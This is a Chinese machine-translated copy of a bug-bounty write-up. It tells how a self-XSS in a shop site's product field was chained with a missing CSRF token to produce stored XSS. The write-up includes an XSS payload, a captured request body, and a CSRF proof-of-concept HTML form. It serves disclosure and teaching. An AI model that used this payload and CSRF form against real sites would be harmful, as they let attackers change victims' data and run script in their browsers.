<html>
<head>
<title>[Duplicated] Self-XSS &amp; CSRF attack lead to Stored XSS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[复制]自我XSS和CSRF攻击导致存储XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/duplicated-self-xss-csrf-attack-lead-to-stored-xss-1a1db9f9bb90?source=collection_archive---------1-----------------------#2019-04-16">https://infosecwriteups.com/duplicated-self-xss-csrf-attack-lead-to-stored-xss-1a1db9f9bb90?source=collection_archive---------1-----------------------#2019-04-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/f32090b62fd665d7d5f544991281da6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*-Ekn1EeB3PjDC3nuUM1fbA.png"/></div></figure><p id="01ee" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">嗨伙计们</p><p id="c82a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是我的Flex，在这篇文章中，我将分享一个私人程序的新漏洞，让我们称之为“example.com ”,该漏洞是一个自我XSS与CSRF攻击，导致存储XSS。</p><h1 id="af22" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">发现的故事</h1><p id="5d56" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">目标是一个商店网站，当我测试添加产品的功能时，我开始添加我可爱的XSS有效负载<strong class="jw ir">&lt;SVG/onload = alert(0)&gt;</strong>到处都是，其中一个字段工作，并给我一个弹出窗口，因为字段的输入是错误的，网站告诉我这个值是错误的，所以这是一个自我XSS我试图找到点击劫持，使其可利用，但没有办法与点击劫持， 几分钟后，我试图找到一个CSRF攻击，所以我打开我的打嗝，捕捉到更改请求，我注意到没有CSRF令牌或任何CSRF保护，所以我试图利用这两个错误一起获得存储的XSS，编辑后的请求的主体是这样的</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="9083" class="me kt iq ma b gy mf mg l mh mi">{"basePage":{"draftIds":["victim_id"],"wsId":"-1","wsType":"-1"},"mode":"INDIVIDUAL","action":"SAVE","layerName":"EDITPANE","variation":null,"currencyInfo":{"currencySymbolLeft":true,"singularName":"U.S. dollars","moneySymbol":"$","decimalSymbol":".","groupingSymbol":",","gS":",","decimalPlaces":"2","currencyCode":"USD","pluralName":"U.S. dollar"},"singleList":true,"listingMode":"AddItem","fields":{"upc":"XSS_payload","":"true"},"updateRequired":true,"customFields":{},"byPassUpdate":false,"sellerType":"C2C","isAdd":"","saveUlsi":true,"edpCrNew":false,"deletedFields":[],"updateCrNew":true,"recentCategories":null,"suggestedCategories":["13718:Collectibles &gt; Arcade, Jukeboxes &amp; Pinball &gt; Arcade Gaming &gt; Replacement Parts","57988:Clothing, Shoes &amp; Accessories &gt; Mens Clothing &gt; Coats &amp; Jackets","217:Sports Mem, Cards &amp; Fan Shop &gt; Sports Trading Cards &gt; Other Sports Trading Cards","48:Collectibles &gt; Photographic Images &gt; Contemporary (1940-Now) &gt; Other Contemporary Photographs","75708:Toys &amp; Hobbies &gt; Action Figures &gt; TV, Movie &amp; Video Games"],"customAttributes":{"PL_OPT_IN":"0","PL_SELLER_ELIGIBLE":"1","PL_FORMAT_ELIGIBLE":"0","PL_CATEGORY_ELIGIBLE":"0","PL_ALREADY_OPTED":"0"},"draftMode":"Listing","restricted":false,"customPreference":{"preferences":{"scheduleStartTime":true,"reservePrice":true,"sellAsLot":true,"privateListing":true,"":true,"additionalPaymentOptions":true,"additionalCheckoutInstructions":true,"salesTax":true,"additionalReturnPolicyDetails":true,"internationalShipping":true,"shippingExclusionList":true,"shippingRateTable":true},"sellerDetails":["NO_STORE_SUBSCRIPTION","NO_SHIPPING_DISCOUNTS","NON_SM_SELLER"]},"payments20":false,"isvShown":false}</span></pre><p id="b105" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以，我只是希望受害者草案id使用CSRF攻击来更改草案信息，并添加XSS有效载荷，我使用的CSRF代码</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="cc4e" class="me kt iq ma b gy mf mg l mh mi">&lt;form action="https://exampl.com/endpoint" method="POST"&gt;<br/>    &lt;input type="hidden" name="clientType" value="Firefox:66:"&gt;<br/>    &lt;input type="hidden" name="request" value='[add_decode_value_here]'&gt;<br/>    &lt;input type="submit" value="send"&gt;<br/>&lt;/form&gt;</span></pre><p id="2242" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我使用这段HTML代码，并在上面添加带有受害者草稿ID和XSS有效载荷BOOOM的请求体时！！字段值将被更改，当用户再次访问他的页面时，XSS有效负载将被执行。</p><p id="22de" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">对我很好但是也是复制的:_(。</p><p id="6ce4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">结束了。</p></div></div>    
</body>
</html>